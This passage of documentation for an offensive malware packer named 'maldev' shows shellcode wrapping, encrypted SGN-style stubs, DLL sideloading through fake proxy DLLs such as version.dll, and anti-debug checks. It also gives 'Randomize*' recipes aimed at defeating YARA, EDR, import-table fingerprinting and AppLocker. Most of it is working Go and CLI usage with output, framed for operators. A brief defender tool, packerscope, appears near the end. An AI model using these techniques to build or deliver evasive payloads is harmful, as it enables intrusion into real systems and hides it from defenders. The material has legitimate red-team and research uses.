`PackShellcode` wraps the bytes in a minimal host first, then
optionally runs that host through `PackBinary` for the SGN-style stub
envelope.

```go
// Plain wrap — runnable, shellcode at e_entry in cleartext.
exe, _, _ := packer.PackShellcode(sc, packer.PackShellcodeOptions{
    Format: packer.FormatLinuxELF,
})

// Encrypted wrap — SGN-style stub decrypts in place + JMPs to entry.
exe, key, _ := packer.PackShellcode(sc, packer.PackShellcodeOptions{
    Format:  packer.FormatLinuxELF,
    Encrypt: true,
})
```

CLI:

```bash
$ printf '\x48\xc7\xc0\xe7\x00\x00\x00\x48\xc7\xc7\x2a\x00\x00\x00\x0f\x05' > sc.bin

$ packer shellcode -in sc.bin -out plain.elf -format linux-elf
shellcode: 16 bytes → plain.elf (401 bytes, encrypt=false, format=linux-elf)
$ ./plain.elf; echo $?
42

$ packer shellcode -in sc.bin -out enc.elf -format linux-elf -encrypt
shellcode: 16 bytes → enc.elf (8192 bytes, encrypt=true, format=linux-elf)
2e93292902833d9ab1fb7316f9b9f5f835cfc6c2e15fc78ad1553d1b75bd8606
$ ./enc.elf; echo $?
42
```

| Property | Plain wrap | Encrypted wrap |
|---|---|---|
| Output | minimal PE / ELF | SGN-style packed PE / ELF |
| Size (16 B sc) | ~400 B | ~8 KiB |
| Shellcode at e_entry? | yes, cleartext | no — stub at e_entry |
| YARA the .text? | sees plaintext shellcode | sees ciphertext + stub |
| Per-pack polymorphism | no | yes (rounds + seed) |
| Use when | shellcode is pre-encrypted upstream, OR stealth not the concern | real-world EDR-facing ship |

**Format-specific notes:**

- **Linux**: a section-aware minimal ELF writer (`transform.BuildMinimalELF64WithSections`)
  pre-reserves one phdr slot so `InjectStubELF` has the headroom it
  needs to append its stub PT_LOAD. The Brian-Raiter-style
  `BuildMinimalELF64` (no SHT) cannot be fed to PackBinary —
  PlanELF rejects it with `ErrNoTextSection`.
- **Windows**: `transform.BuildMinimalPE32Plus` already produces a
  PE with a real `.text` section header; the chain works out of
  the box.

**Per-build IOC randomisation:** pass `ImageBase` / `Vaddr` (`-base 0xHEX`
on the CLI) to defeat YARA rules keyed on "tiny PE/ELF at standard
load address". Canonical bases (0x140000000 PE, 0x400000 ELF) are the
default; per-deployment values are derived from your secret via
[`packer.DeriveBundleProfile`](#per-build-ioc-randomisation--kerckhoffs).

**Avantages:** the only path that takes shellcode end-to-end. Same
SGN-style stub envelope as `PackBinary` for Go binaries — operators
get one mental model regardless of payload shape.

**Inconvénients:**

- Shellcode must be position-independent (no relocations expected,
  no specific load address baked in). Standard for msfvenom output;
  hand-rolled stage-1 needs the same discipline.
- Encrypted shellcode + Windows shellcode that ends in `ret` rely on
  ntdll's `RtlUserThreadStart` to call `ExitProcess(rax)` for a clean
  exit code. Shellcode that needs explicit ExitProcess (e.g. when
  exec ends mid-stream, not via ret) must walk the PEB itself —
  msfvenom's templates already do this; hand-rolled stage-1 needs
  the same discipline or it crashes silently with `0xc0000005`.

---

## DLL operations (Modes 7–10)

The four modes below all produce **PE32+ DLLs** instead of EXEs.
They unlock the operator playbook of running payloads inside a
host process via the Windows DLL load mechanism — sideloading,
classic injection, LOLBAS chains (`rundll32`, `regsvr32`),
search-order hijack, COM hijack. Each picks a different
trade-off between operator simplicity, OPSEC cleanliness, and
the input shape required.

**Quick selector:**

| Operator goal | Mode | Output |
|---|---|---|
| Pack an existing native DLL — preserve its DllMain | 7 (`FormatWindowsDLL`) | one DLL |
| Convert an EXE into a runnable DLL — payload spawns on attach | 8 (`ConvertEXEtoDLL`) | one DLL |
| Sideload an EXE under a fake DLL name — two-file drop, OK if drop policy allows | 9 (`PackChainedProxyDLL`) | two DLLs (proxy + payload) |
| Sideload an EXE under a fake DLL name — single-file drop, no `LoadLibraryA` IOC in the IAT | 10 (`PackProxyDLL`) | one fused DLL |

Modes 7–10 share the same Phase 2 randomisation surface as
Mode 3 (`RandomizeAll` etc. — see [Per-pack
randomisation](#per-pack-randomisation-phase-2-opts) below)
and the same DLL-input restrictions
(`transform.ErrTLSCallbacks` rejects mingw default builds,
`transform.ErrIsDLL` cross-checks input vs Format).

### Mode 7 — `FormatWindowsDLL` (pack a native DLL)

You have a DLL with its own `DllMain`. You want to encrypt
its `.text` and ship a packed copy that LoadLibrary'd cleanly
runs the original `DllMain`. The payload semantic — what the
DLL DOES — is preserved verbatim; only the on-disk bytes of
the code section are obfuscated.

```go
out, _, err := packer.PackBinary(input, packer.PackBinaryOptions{
    Format:       packer.FormatWindowsDLL,  // ← was FormatWindowsExe
    Stage1Rounds: 3,
    Seed:         0,
    AntiDebug:    true,
    RandomizeAll: true,  // composes — see Phase 2 opts below
})
```

| Property | Value |
|---|---|
| Input | PE32+ DLL with `IMAGE_FILE_DLL` set + a non-empty `.reloc` table |
| Output | PE32+ DLL — `LoadLibrary`'s natively |
| Encryption | SGN polymorphic encoder (per-round register-randomised) |
| Stub | DllMain prologue → decrypt-once flag check → SGN rounds → tail-jump to original DllMain |
| Process tree | One DLL hosted by whatever called `LoadLibrary` |
| Stub size | ~230 bytes (no compression) |

**Avantages:**
- Drop-in replacement for the original DLL.
- Original DllMain is preserved — every reason code
  (`PROCESS_ATTACH`, `THREAD_ATTACH`, …) still gets the right
  user-defined behaviour.
- Composes with `RandomizeAll` (8 Phase 2 randomisers).

**Inconvénients:**
- Requires the input to carry a populated `.reloc` directory.
  **Mingw `ld` for x64 PE refuses to emit `.reloc` even with
  `--enable-reloc-section + --dynamicbase`** (toolchain
  limitation, documented in `pe/packer/testdata/testlib.c`).
  Build the DLL with MSVC (`cl /LD foo.c /link /DYNAMICBASE`)
  or use `transform.BuildMinimalPE32Plus` in tests.
- The packed `.text` is RWX at runtime (loud EDR signal).
- Compress is unsupported in Mode 7 today
  (`stubgen.ErrCompressDLLUnsupported`) — the LZ4 inflate
  block isn't yet threaded through the DllMain stub layout.

**Validated end-to-end on Win10 VM** since v0.128.0
(`TestPackBinary_FormatWindowsDLL_LoadLibrary_E2E`). The
1-line MEM_WRITE fix in v0.128.0 closed the slice 4.5 gap
that had blocked real-loader validation since v0.111.0.

### Mode 8 — `ConvertEXEtoDLL` (convert an EXE into a runnable DLL)

You have a Go EXE (or any `-nostdlib` Win32 EXE). You want
the SAME PAYLOAD to run when something `LoadLibrary`'s a DLL,
so you can drop it into a sideload chain, inject it via
`CreateRemoteThread`-equivalents, or call it via `rundll32`.

The packer takes your EXE, encrypts `.text`, appends a
DllMain stub, and flips `IMAGE_FILE_DLL`. At runtime the
DllMain decrypts `.text`, resolves `kernel32!CreateThread`
via PEB walk (no IAT entry on `CreateThread` — invisible at
import-table inspection time), and spawns a new thread on
the original EXE's entry point. The DllMain returns `TRUE`
immediately; the loader is unblocked while the payload runs
in the spawned thread.

```go
out, _, err := packer.PackBinary(exe, packer.PackBinaryOptions{
    Format:          packer.FormatWindowsExe,  // input is EXE
    ConvertEXEtoDLL: true,                     // ← convert at pack time
    Stage1Rounds:    3,
    Seed:            0,
    Compress:        true,                     // ✅ supported in Mode 8 (since v0.124.0)
    AntiDebug:       true,                     // ✅ supported in Mode 8 (since v0.122.0)
    RandomizeAll:    true,
})
```

| Property | Value |
|---|---|
| Input | PE32+ EXE (the same shapes Mode 3 accepts: Go static-PIE, mingw `-nostdlib`, …) |
| Output | PE32+ DLL with `IMAGE_FILE_DLL` set, encrypted `.text`, appended stub |
| Stub | DllMain prologue → decrypt-once flag check → SGN rounds → optional LZ4 inflate (`Compress: true`) → PEB-walk resolve `CreateThread` → `CreateThread(NULL, 0, OEP, NULL, 0, NULL)` → return TRUE |
| Process tree | One image hosted by the LoadLibrary'er; payload is a thread inside that process |
| Stub size | ~509 bytes (3 SGN rounds, no Compress) → ~700 bytes (with Compress) → +50 bytes if AntiDebug |

**Avantages:**
- The same Go EXE is now usable in BOTH Mode 3 (run as EXE)
  and Mode 8 (sideload as DLL) without rebuilding.
- Composes with `Compress` (slice 5.7), `AntiDebug` (slice
  5.6), and the full Phase 2 randomisation suite.
- No `LoadLibraryA` IAT entry — the proxy DLL imports nothing
  it doesn't already need.
- Validated on Win10 VM with the `probe_converted.exe`
  fixture (writes `"OK\n"` from the spawned thread inside the
  host process — see
  `TestPackBinary_ConvertEXEtoDLL_LoadLibrary_E2E`).

**Inconvénients:**
- The payload runs in a NEW thread that's still alive when
  DllMain returns. If the host process tears down quickly
  the payload may not finish — `Sleep(INFINITE)` or proper
  thread synchronisation in your payload.
- The EXE entry point sees `(int argc, char **argv)`
  semantics from a non-standard launch — argv is whatever
  the spawned thread's stack happens to hold. Payloads that
  parse args need to fall back to `GetCommandLineW` or
  similar.
- AntiDebug runs BEFORE the SGN/CreateThread path; positive
  detection (KVM tripping the RDTSC↔CPUID delta on most
  virtualised hosts) results in a SILENT no-op DLL load —
  loader sees BOOL TRUE, payload never runs. Bare-metal
  undebugged hosts fall through to the full pipeline.

### Mode 9 — `PackChainedProxyDLL` (two-file sideloading bundle)

You want to drop a DLL named like a legitimate Windows DLL
(e.g. `version.dll`) next to a host EXE that imports from it.
The host loads the proxy, the proxy forwards every export
back to the real `version.dll`, AND the proxy's DllMain
LoadLibrary's a separate payload DLL that contains your
encrypted EXE. **Two files: proxy DLL + payload DLL.**

This is the operator-friendly composition: you call ONE
function, get TWO byte streams, drop both side-by-side.

```go
proxy, payload, _, err := packer.PackChainedProxyDLL(exe,
    packer.ChainedProxyDLLOptions{
        TargetName:     "version",       // → version.dll mirror
        Exports:        []dllproxy.Export{
            {Name: "GetFileVersionInfoSizeW"},
            {Name: "GetFileVersionInfoW"},
            {Name: "VerQueryValueW"},
        },
        PayloadDLLName: "payload.dll",   // proxy will LoadLibraryA this
        PackOpts: packer.PackBinaryOptions{
            Format:       packer.FormatWindowsExe,
            Stage1Rounds: 3,
            Seed:         0,
        },
    })
// Write proxy as `version.dll` next to host EXE, payload as
// `payload.dll` in the same directory.
os.WriteFile("/dropdir/version.dll", proxy, 0o644)
os.WriteFile("/dropdir/payload.dll", payload, 0o644)
```

| Property | Value |
|---|---|
| Output | TWO DLLs: `proxy` (forwarder + LoadLibraryA stub) + `payload` (encrypted EXE-as-DLL) |
| Proxy size | ~3-5 KB (depends on export count + path scheme) |
| Payload size | Input size + ~600 B SGN stub |
| Forwarders | Perfect-DLL-proxy GLOBALROOT scheme by default — `\\.\GLOBALROOT\SystemRoot\System32\version.<export>` |

**Avantages:**
- Operator gets the two-file drop without wiring two
  emitters by hand.
- The legit-target's exports are forwarded transparently —
  the host EXE's calls to `GetFileVersionInfoSizeW` etc. all
  succeed, returning the real version.dll's results.
- Payload DLL is independently swappable (re-pack
  `payload.dll` with new opts, leave `proxy.dll` alone).

**Inconvénients:**
- **Two-file drop** — needs the operator to place both files
  successfully. AppLocker / WDAC policies that whitelist a
  single DLL by hash will catch the second drop.
- Proxy IAT carries `kernel32!LoadLibraryA` — a detectable
  IOC for kits that fingerprint proxy DLLs by their import
  set. Mode 10 (`PackProxyDLL`) ships the single-file fused
  variant that eliminates this.

### Mode 10 — `PackProxyDLL` (single-file fused proxy, no LoadLibraryA IOC)

The OPSEC-cleaner sibling of Mode 9. ONE PE that:
- Mirrors the legit target's exports (each forwarded via the
  perfect-dll-proxy absolute path).
- Carries the encrypted EXE payload inside the same PE (no
  separate `payload.dll` to drop).
- Has NO `LoadLibraryA` IAT entry — `CreateThread` is
  resolved at runtime via PEB walk, so the proxy doesn't even
  need `kernel32` import.

```go
fused, _, err := packer.PackProxyDLL(exe, packer.ProxyDLLOptions{
    TargetName: "version",
    Exports: []dllproxy.Export{
        {Name: "GetFileVersionInfoSizeW"},
        {Name: "GetFileVersionInfoW"},
        {Name: "VerQueryValueW"},
    },
    PackOpts: packer.PackBinaryOptions{
        Format:       packer.FormatWindowsExe,
        Stage1Rounds: 3,
        Seed:         0,
    },
})
// Single drop. Name it after the legit target.
os.WriteFile("/dropdir/version.dll", fused, 0o644)
```

| Property | Value |
|---|---|
| Output | ONE PE32+ DLL — IMAGE_FILE_DLL set, EXPORT directory populated, encrypted EXE in `.text` |
| Imports | None (CreateThread resolved via PEB walk) |
| Size | Input EXE + ~500 B SGN stub + ~200 B per export forwarder string |
| Forwarders | Perfect-DLL-proxy GLOBALROOT scheme by default |

**Avantages:**
- Single-file drop — most restrictive AppLocker policies
  permit a one-file replacement when the path/name match.
- **Zero IAT entries** — defeats import-table fingerprinting.
- Inherits all Mode 8 strengths (Compress, AntiDebug, full
  Phase 2 randomisation).

**Inconvénients:**
- The output is bigger than Mode 9's proxy (carries both the
  forwarders AND the encrypted payload).
- The export forwarders are visible in the PE on disk —
  static analysis can see the `version.dll` mirror. Use a
  different `TargetName` for OPSEC variance, but it must
  still match a real DLL on the target host or the loader
  rejects the forwarders.
- Implementation note: the fused emitter composes
  `PackBinary{ConvertEXEtoDLL: true}` + `transform.AppendExportSection`
  + `dllproxy.BuildExportData`. ~200 LOC orchestrator.
  Original plan (`packer-exe-to-dll-plan.md` slice 6 Path B)
  estimated ~450 LOC for a hand-rolled merged injector;
  composition saved ~250 LOC.

**Strict end-to-end validation** (since `c9c0635`,
2026-05-12): `TestPackProxyDLL_Strict_E2E` packs
`probe_converted.exe`, drops as `version.dll`, then asserts
both side effects on Win10 VM:
1. `GetProcAddress("GetFileVersionInfoSizeW")` resolves to
   the real `version.dll` (loader follows the GLOBALROOT
   forwarder string).
2. The packed EXE's `main()` runs in a spawned thread inside
   the host process — observable via the marker file
   `C:\maldev-probe-marker.txt`.

### When to pick which DLL mode — decision tree

```
Is your input a DLL with its own DllMain you want to keep?
  YES → Mode 7 (FormatWindowsDLL) — preserve DllMain, encrypt .text
  NO  → input is an EXE
        ↓
        Do you need EXPORTS (sideload as a fake legit DLL)?
          NO  → Mode 8 (ConvertEXEtoDLL) — minimal DLL output
          YES → How strict is the drop policy?
                  Two files OK   → Mode 9 (PackChainedProxyDLL)
                  Single file    → Mode 10 (PackProxyDLL)  ← OPSEC-cleanest
```

### Composability with `pe/dllproxy` and `pe/masquerade`

- **`pe/dllproxy`** ships `Export`, `PathScheme`,
  `BuildExportData` — Mode 10 reuses all three. Operators
  can also call `dllproxy.GenerateExt` directly when they
  want a forwarder-only DLL with NO encrypted payload (pure
  sideloading, no implant).
- **`pe/masquerade`** ships `Resources` (icon + manifest +
  version-info + cert) extraction/transplant via
  `tc-hib/winres`. The natural composition: extract
  resources from a legit DLL → pack EXE via Mode 10 → use
  `winres.LoadFromEXE + ResourceSet.WriteToEXE` to
  transplant the legit resources onto the fused proxy. The
  Phase 2-F-3-c-3 RESOURCE walker (v0.125.0) ensures these
  transplanted resources survive `RandomizeAll`.
- **`pe/parse`** exposes `Exports(path)` — the natural input
  source for Mode 9 / Mode 10's `Exports` field. Extract
  from `C:\Windows\System32\version.dll` on a Win10 host →
  feed the result straight into `PackProxyDLL`.

---

## Per-pack randomisation (Phase 2 opts)

The `Mode 3 PackBinary` example above shows a long list of
`Randomize*` flags. Each one defeats a specific class of
fingerprinting heuristic. None of them change the **runtime
behavior** of the packed binary — only its **on-disk shape**
or the **VAs/headers a static analyst sees**. They're all
opt-in (default `false`) so the "vanilla pack" stays
byte-reproducible, which several CI integrations rely on.

The shortcut `RandomizeAll: true` enables every opt that the
Win10 VM E2E test confirms is safe across heterogeneous
payloads. Two opts (`RandomizeImageBase`, `RandomizeImageVAShift`)
are deliberately NOT in the fan-out — they're EXPERIMENTAL,
gated on an unfinished walker suite, and can crash certain
binaries. Operators can still set them per-payload.

### What each opt defeats — at a glance

| Opt | What changes in the file | What detection it defeats | Phase | Tag |
|---|---|---|---|---|
| `RandomizeStubSectionName` | Last (stub) section name: `.mldv` → `.xkqwz` | YARA rules pinned to the literal `.mldv` byte sequence | 2-A | v0.94.0 |
| `RandomizeTimestamp` | COFF `TimeDateStamp` field | Threat-intel pivots clustering samples by linker timestamp (`"all linked Tue 14:32 UTC"`) | 2-B | v0.95.0 |
| `RandomizeLinkerVersion` | Optional Header `MajorLinker` + `MinorLinker` | Pivots like `"all samples linked with VS2017 14.16"` | 2-C | v0.96.0 |
| `RandomizeImageVersion` | Optional Header `MajorImage` + `MinorImage` | Per-binary version-stamp clustering | 2-D | v0.97.0 |
| `RandomizeAll` | Every opt above + every opt below | Convenience aggregator (excludes EXPERIMENTAL) | 2-E | v0.98.0 |
| `RandomizeExistingSectionNames` | Every host section name: `.text/.rdata/.data` → random `.xxxxx` | "section called .text is RWX → suspicious" + YARA rules pinned to host section labels | 2-F-1 | v0.99.0 |
| `RandomizeJunkSections` | Append [1, 5] uninitialised BSS sections after the stub | "exact section count" heuristics + "stub is section[N-1]" patterns. **File size unchanged** (no file backing). | 2-F-2 | v0.100.0 |
| `RandomizePEFileOrder` | Permute the file-layout order of host section bodies | YARA rules anchored at file offsets (`"bytes at file 0x400 = decryption key"`). **Runtime image byte-identical** (only file offsets change). | 2-F-3-b | v0.102.0 |
| `RandomizeImageBase` | PE32+ Optional Header `ImageBase` + reloc-fixed pointer values | Heuristics on the canonical Go `0x140000000` preferred-base | 2-F-3-c | v0.106.0 (in `RandomizeAll` since v0.106.0 — earlier intermittent crashes were caused by missing reloc value fixup, fixed empirically) |
| `RandomizeImageVAShift` | Every section's VA + reloc-fixed pointer values + import-descriptor RVAs | Heuristics on canonical VA layout (`.text starts at 0x1000`, `OEP at 0x140001000`) | 2-F-3-c-2 | v0.104.0 (in `RandomizeAll` since the IMPORT walker landed; covers Go static-PIE binaries) |

### Concrete before/after

Pack `winhello.exe` twice from the same input + seed: once
vanilla, once with `RandomizeAll`. Then dump section tables
with the diagnostic CLI:

```bash
$ go run ./cmd/packer-vis sections vanilla.exe
file: vanilla.exe (1676288 bytes)
NumberOfSections: 9
COFF.PointerToSymbolTable: 0x198200  NumberOfSymbols: 0

#    Name        VA          VirtSize    RawOff      RawSize     Characteristics
0    .text       0x00001000  0x000a3ab1  0x00000600  0x000a3c00  0xe0000020 [CODE RWX]
1    .rdata      0x000a5000  0x000dd008  0x000a4200  0x000dd200  0x40000040 [DATA R]
2    .data       0x00183000  0x00057a28  0x00181400  0x0000dc00  0xc0000040 [DATA RW]
3    .pdata      0x001db000  0x00004be4  0x0018f000  0x00004c00  0x40000040 [DATA R]
4    .xdata      0x001e0000  0x000000a8  0x00193c00  0x00000200  0x40000040 [DATA R]
5    .idata      0x001e1000  0x0000055a  0x00193e00  0x00000600  0xc0000040 [DATA RW]
6    .reloc      0x001e2000  0x00003d4c  0x00194400  0x00003e00  0x42000040 [DATA R]
7    .symtab     0x001e6000  0x00000004  0x00198200  0x00000200  0x42000000 [R]
8    .mldv       0x001e7000  0x00001000  0x00198400  0x00001000  0x60000020 [CODE RX]

$ go run ./cmd/packer-vis sections randomized.exe
file: randomized.exe (1676288 bytes)
NumberOfSections: 11               # ← +2 from RandomizeJunkSections
COFF.PointerToSymbolTable: 0xe2800 # ← moved by RandomizePEFileOrder

#    Name        VA          VirtSize    RawOff      RawSize     Characteristics
0    .jgvcc      0x00001000  0x000a3ab1  0x000e7c00  0x000a3c00  0xe0000020 [CODE RWX]
1    .tzmsj      0x000a5000  0x000dd008  0x00000600  0x000dd200  0x40000040 [DATA R]
2    .vwwcw      0x00183000  0x00057a28  0x0018b800  0x0000dc00  0xc0000040 [DATA RW]
3    .soffy      0x001db000  0x00004be4  0x000e2a00  0x00004c00  0x40000040 [DATA R]
4    .lnfio      0x001e0000  0x000000a8  0x000dd800  0x00000200  0x40000040 [DATA R]
5    .raoac      0x001e1000  0x0000055a  0x000e7600  0x00000600  0xc0000040 [DATA RW]
6    .dinxv      0x001e2000  0x00003d4c  0x000dda00  0x00003e00  0x42000040 [DATA R]
7    .etahy      0x001e6000  0x00000004  0x000e2800  0x00000200  0x42000000 [R]
8    .hrukp      0x001e7000  0x00001000  0x000e1800  0x00001000  0x60000020 [CODE RX]
9    .rsnnn      0x001e8000  0x00001000  0x00000000  0x00000000  0x40000080 [BSS R]
10   .klvpv      0x001e9000  0x00001000  0x00000000  0x00000000  0x40000080 [BSS R]
```

What changed on disk:

- **Names** — every section, including the appended stub, got a
  random `.xxxxx` name (Phase 2-F-1 + 2-A).
- **File layout** — `.jgvcc` (was `.text`) is now at file offset
  `0xe7c00` instead of `0x600`; `.tzmsj` (was `.rdata`) is at
  `0x600` instead of `0xa4200` (Phase 2-F-3-b).
- **Section count** — 9 → 11; `.rsnnn` and `.klvpv` are zero-byte
  BSS placeholders the loader maps as zero-filled but consume
  no file bytes (Phase 2-F-2).
- **COFF.PointerToSymbolTable** correctly tracks the new file
  position of the section that carried it.

What did NOT change:

- Every section's `VA` and `VirtSize` is **identical** between
  the two packs. The runtime memory image is byte-identical.
- File size: identical (1676288 bytes). Phase 2-F-2 separators
  carry no file bytes; Phase 2-F-3-b just shuffles existing
  bodies.
- The stub still runs, the `.text` still decrypts, the
  payload still prints `"hello from windows"` (validated by
  Win10 VM E2E `TestPackBinary_WindowsPE_RandomizeAll_E2E`).

### Recipes — common operator goals

| Goal | Opt combo |
|---|---|
| **Cheapest "looks different"** — defeat shallow YARA + sample-clustering by linker metadata, ~zero risk | `RandomizeStubSectionName + RandomizeTimestamp + RandomizeLinkerVersion + RandomizeImageVersion` |
| **All defaults defeated** — ship one variant per target with maximum on-disk + structural variance, validated end-to-end | `RandomizeAll: true` |
| **File-offset YARA only** — the rule says `at offset 0x400 expect bytes XX YY ZZ` and we need to defeat just that | `RandomizePEFileOrder: true` (one opt; no header changes, runtime image untouched) |
| **Section-count hunting** — analyst keys on "Go binary always has 8 sections" | `RandomizeJunkSections: true` (per-pack count drawn from [1, 5]) |
| **Reproducible build** — operator-supplied `Seed` produces deterministic output across runs of `PackBinary` (useful for diff tooling, batch-pack pipelines) | Set `opts.Seed` to any non-zero `int64`. All `Randomize*` opts seed from this value with per-opt offsets so they decorrelate. |
| **Maximum stealth, accept the experimental risk** — also push VAs around | `RandomizeAll: true` + `RandomizeImageBase: true`. Test on the actual payload before deploying — VA experiments can crash some Go versions. |

### Composing with the operator-side `Seed`

When `opts.Seed != 0`, every randomiser derives its math/rand
stream from `Seed + perOptOffset`. The offsets (defined as
`seedOffset*` constants in `pe/packer/packer.go`) are fixed per
opt, so two packs with the same `Seed` produce byte-identical
outputs. Two packs with different `Seed` values produce
different outputs even when only ONE opt is enabled.

When `opts.Seed == 0`, the packer draws ONE crypto-random seed
from `random.Int64()` at the top of `PackBinary` and feeds it
to every enabled randomiser via the same offset scheme. Result:
crypto-random output across runs, but still single-syscall on
the random source.

This means an operator scripting a batch pack can choose between:

- `Seed: 0` (default) — fresh per-pack crypto-random output, no
  operator state to track.
- `Seed: <some int64>` — deterministic output, useful when the
  same artefact must be regenerated bit-for-bit on a different
  machine.
- `Seed: <derived from per-target string>` — a poor man's
  "fingerprint as seed" that produces the same artefact for the
  same target without storing any state.

### Validation

Two safety nets keep the per-pack randomisation honest:

1. **Unit + integration tests in `pe/packer/`** — every opt has
   a `_PreservesInput` test (default-off → byte-stable behaviour
   matches v0.93 baseline) and a `_DeterministicGivenSeed` test
   (same seed → same output).
2. **Win10 VM end-to-end test** —
   `TestPackBinary_WindowsPE_RandomizeAll_E2E` (build-tag gated)
   packs `winhello.exe` with `RandomizeAll: true`, executes the
   resulting PE on a real Windows VM, and asserts stdout
   contains `"hello from windows"`. This is the gate before
   adding any new opt to the `RandomizeAll` fan-out.

The Phase 2-F-3-c experimental opts (`RandomizeImageBase`,
`RandomizeImageVAShift`) are excluded from `RandomizeAll`
precisely because they don't yet pass this Win10 E2E. The
walker-suite roadmap that will let them join is in
`docs/refactor-2026-doc/packer-2f3c-walker-suite-plan.md`.

---

## Per-build IOC randomisation — Kerckhoffs

Per Kerckhoffs's principle: the algorithm is public; only the secret
is the operator's. The wire format spec is in
`docs/superpowers/specs/2026-05-08-packer-multi-target-bundle.md` —
reproducible by anyone. The **per-build secret** (any string the
operator picks per deployment) derives via HKDF-SHA256 (RFC 5869,
v0.83.0+) to:

| IOC byte layer | What it is | Derivation |
|---|---|---|
| `BundleMagic` (4 B at offset 0) | Bundle blob magic | `HKDF(secret, "maldev/bundle/magic", 4)` |
| `FooterMagic` (8 B at end of wrap) | Launcher trailer sentinel | `HKDF(secret, "maldev/bundle/footer", 8)` |
| `BundleVersion` (2 B at offset 4) | Wire format version field | `HKDF(secret, "maldev/bundle/version", 2) | 0x8000` |
| `Vaddr` (8 B in p_vaddr/p_paddr) | All-asm ELF load address | `HKDF(secret, "maldev/bundle/vaddr", 8)` (page-aligned, user-space half) |

Each field's HKDF expansion uses a purpose-bound label, so flipping
bits in one field gives an attacker no algebraic handle on the
others — they are statistically independent rather than slices of
the same hash. Pre-v0.83.0 builds used `sha256(secret)[a:b]` slicing;
bundles produced under that scheme are NOT compatible with v0.83.0+
when a non-empty secret is set. Re-pack at the migration boundary.

A defender writing yara on canonical builds matches "MLDV at offset
0", "version field == 1", "PT_LOAD at vaddr 0x400000". A
defender facing per-build artefacts matches none of those without
the secret in hand.

```go
profile := packer.DeriveBundleProfile([]byte("op-2026-05-09-targetA"))
// profile.Magic, .FooterMagic, .Version, .Vaddr all set.

bundle, _ := packer.PackBinaryBundle(payloads, packer.BundleOptions{Profile: profile})
wrapped := packer.AppendBundleWith(launcher, bundle, profile)
```

The launcher needs the SAME secret at build time:

```bash
$ go build -ldflags "-X main.bundleSecret=op-2026-05-09-targetA" \
    -o bundle-launcher ./cmd/bundle-launcher
```

`packer bundle -wrap` prints this build line as a hint when given
`-secret`.

**What this protects against:**
- Static signature pivots across deployments.
- IOC sharing between operators / between ops cycles.
- Stub byte signatures across packs (per-pack NOP polymorphism is
  independent of the secret — every pack is unique even within a
  single deployment).

**What this does NOT protect against:**
- An analyst who has the secret. The wire format is documented;
  recovery is mechanical via the *With variants of the parser API
  or via `cmd/packerscope -secret`.
- Yara rules keyed on the **structural shape** of the produced
  binary (single-PT_LOAD-RWX ELF for the all-asm path; appended
  `.mldv` section for PackBinary). Defenders writing shape rules
  match every build regardless of secret.

---

## Defender pair — `cmd/packerscope`

Symmetric companion: detect, dump, and extract maldev artefacts.
Algorithm is public, so this tool exists.

```bash
# Identify what kind of artefact a file is.
$ packerscope detect ./suspect.bin
kind: launcher-wrapped
  - MLDV-END-style footer at end of file

# Dump the wire-format structure.
$ packerscope dump ./bundle.bin
artefact: raw-bundle (139 bytes)
bundle:   magic=0x56444c4d version=0x1 count=1 fallback=0
  [0] pred=0x08 vendor="*"          build=[0, 0] data=0x70..+27

# Extract decrypted payload(s) to disk.
$ packerscope extract ./bundle.bin -out ./extracted/
payload 00: 27 bytes → ./extracted/payload-00.bin
```

For per-build artefacts, pass the operator's secret:

```bash
$ packerscope detect -secret "op-2026-05-09-targetA" ./mystery.bin
kind: launcher-wrapped
  - MLDV-END-style footer at end of file
```

Without the secret, per-build artefacts return `kind: unknown` plus
a structural-hint line ("looks like a tiny single-PT_LOAD-RWX ELF
(suggestive); -secret may be needed").

Use cases:
- Blue team confirming an extracted suspect is one of theirs (e.g.,
  red-team operator's bundle that escaped scope).
- Operator sanity-checking their own build before shipping.
- Integration-test ground truth for yara rules.

---

## Visualisation — `cmd/packer-vis`

Terminal art for understanding what the packer does. No TUI
framework, pure stdlib + ANSI 256 colours.

```bash
# Shannon entropy heatmap, 256-byte windows. Cool blue = code/ASCII;
# hot red = encrypted/compressed. Run before+after `packer pack`
# to see the .text region flip.
$ packer-vis entropy ./input.exe

# Side-by-side, with average-entropy delta:
$ packer-vis compare ./input.exe ./packed.exe
  delta:  size +1832 bytes  entropy +2.43 bits/byte
                            ← strong randomness gain (encryption/compression)

# Bundle wire-format viz — boxed ASCII art, one box per entry,
# offsets + sizes annotated.
$ packer-vis bundle ./bundle.bin
  bundle.bin
  124 bytes | magic=0x56444c4d version=0x1 count=2 fallback=0

  ┌─ BundleHeader ─────────────────────────────────────┐
  │ 0x00..0x20  magic + version + count + offsets      │
  │            fpTable=0x20   plTable=0x80   data=0xc0 │
  └────────────────────────────────────────────────────┘

  ┌─ [0] FingerprintEntry @ 0x20 ────────────────────┐
  │ predType=0x01  vendor="GenuineIntel"  build=[22000, 99999] │
  └────────────────────────────────────────────────────┘
  …
```

Pedagogical: an operator (or a code reviewer) sees the structure
described in this doc as a thing on screen, not just a byte table.

---

## CLI Reference — `cmd/packer`

```
packer pack    -in <file> -out <file> [-format blob|windows-exe|linux-elf]
                                      [-rounds 3] [-seed N] [-compress]
                                      [-antidebug] [-keyout <file>]
packer unpack  -in <file> -out <file> -key <hex32>
packer bundle  -out <file> -pl <spec> [-pl <spec> ...]
                                      [-fallback exit|crash|first]
                                      [-secret <s>]
packer bundle  -inspect <bundle>
packer bundle  -match   <bundle>
packer bundle  -wrap    <launcher> -bundle <bundle> -out <exe>
                                      [-secret <s>]
packer shellcode -in <sc> -out <bin> [-format windows-exe|linux-elf]
                                     [-encrypt] [-base 0xHEX]
                                     [-rounds N] [-seed S]
                                     [-key <hex32>] [-keyout <file>]
```

The `shellcode` subcommand (Mode 6) wraps raw position-independent
shellcode in a runnable host PE / ELF. `-encrypt` chains through
PackBinary's SGN-style stub envelope; without `-encrypt`, the
shellcode sits at the entry point in cleartext (smaller output,
trivially YARA-able).

Bundle spec syntax (`-pl`):

```
<file>:<vendor>:<min>-<max>
  vendor ∈ {intel | amd | *}        (* = any vendor)
  min/max = Windows build number    (use * for "no bound")

  e.g. -pl payload-w11.exe:intel:22000-99999
       -pl payload-w10.exe:amd:10000-19999
       -pl fallback.exe:*:*-*
```

`-fallback` controls what the launcher does when no predicate matches:
- `exit` — silent clean exit (default)
- `first` — select payload 0 unconditionally (defeats per-host secrecy)
- `crash` — deliberate fault → SIGSEGV (sandbox alert)

---

## Library API Reference

### Single-target

#### `func PackBinary(input []byte, opts PackBinaryOptions) (out []byte, key []byte, err error)`

